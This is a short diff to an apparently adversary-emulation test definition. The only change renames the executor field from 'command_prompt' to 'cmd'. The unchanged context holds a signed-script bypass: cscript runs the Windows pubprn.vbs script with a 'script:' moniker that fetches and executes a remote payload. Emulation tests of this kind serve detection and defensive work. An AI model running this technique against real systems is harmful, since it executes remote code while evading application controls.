@@ -21,4 +21,4 @@ steps:
     - name: pubprn.vbs-signed-script-bypass
       inline: |
         cscript.exe /b C:\Windows\System32\Printing_Admin_Scripts\en-US\pubprn.vbs localhost "script:{{.Args.remote_payload}}"
-      executor: command_prompt
+      executor: cmd
